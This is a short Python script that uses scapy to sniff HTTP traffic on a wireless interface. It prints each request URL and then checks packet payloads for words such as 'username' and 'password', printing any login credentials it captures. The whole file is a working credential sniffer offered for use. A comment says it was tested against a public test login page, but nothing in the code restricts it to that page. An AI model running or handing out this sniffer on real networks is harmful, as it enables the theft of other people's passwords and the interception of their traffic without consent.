#!/usr/bin/env python

# run pip install scapy_http before running this
#tested for http login page http://testing-ground.scraping.pro/login

import scapy.all as scapy
from scapy.layers import http


# for each captured packet invoke process_sniffed_packet function
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "usr", "login", "password", "pass", "pwd"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request :" + url)
        login_info = get_login_info(packet)
        if login_info:
            print("[+1] Possible username/password" + login_info + "\n\n")


sniff("wlp4s0")
